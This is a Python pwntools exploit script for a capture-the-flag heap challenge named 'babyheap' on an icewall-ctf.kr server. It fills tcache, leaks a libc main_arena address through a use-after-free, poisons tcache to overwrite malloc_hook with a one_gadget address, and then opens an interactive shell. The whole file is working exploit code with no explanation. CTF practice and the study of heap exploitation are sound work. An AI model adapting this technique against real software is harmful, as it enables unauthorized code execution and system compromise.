from pwn import *
import sys


if len(sys.argv) == 1 :
	p = process('./babyheap')
else :
	p = connect('icewall-ctf.kr', 10209)


def _add(idx, size):
	print '[Log] Heap Allocated: Index=%d, Size=%08X'%(idx, size)

	p.sendline('1')
	p.sendlineafter('idx: ', str(idx))
	p.sendlineafter('size: ', str(size))
	p.recvuntil(': print\n')

def _edit(idx, data):
	print '[Log] Heap Write: Index=%d'%idx
	print '      Content: '+data

	p.sendline('2')
	p.sendlineafter('idx: ', str(idx))
	p.sendlineafter('content: ', data)
	p.recvuntil(': print\n')

def _del(idx):
	print '[Log] Heap Free: Index=%d'%idx

	p.sendline('3')
	p.sendlineafter('idx: ', str(idx))
	p.recvuntil(': print\n')

def _print(idx):
	p.sendline('4')
	p.sendlineafter('idx: ', str(idx))
	data = p.recvuntil('1:')[:-2]
	p.recvuntil(': print\n')
	return data


heap = 0x6010A0

p.recvuntil(': print\n')

_add(0, 0x10)
_add(1, 0x100)

_add(31, 0x100)
_add(30, 0x100)
_add(29, 0x100)
_add(28, 0x100)
_add(27, 0x100)
_add(26, 0x100)
_add(25, 0x100)

_del(31)
_del(30)
_del(29)
_del(28)
_del(27)
_del(26)
_del(25)

_del(1)

# malloc_hook: 0x3EBC30
# free_hook: 0x3ED8E8

main_arena = u64(_print(1).ljust(8, '\x00')) - 96
malloc_hook = main_arena - 0x10
one_shot_gadget = malloc_hook + (0x10a38c-0x3ebc30)

print '\nmain_arena = '+hex(main_arena)
print 'malloc_hook = '+hex(malloc_hook)
print 'one_shot_gadget = '+hex(one_shot_gadget)+'\n'

_edit(25, p64(malloc_hook))

_add(2, 0x100)
_add(2, 0x100)

_edit(2, p64(one_shot_gadget))

p.sendline('1')
p.sendlineafter('idx: ', '3')
p.sendlineafter('size: ', str(0x10))

p.interactive()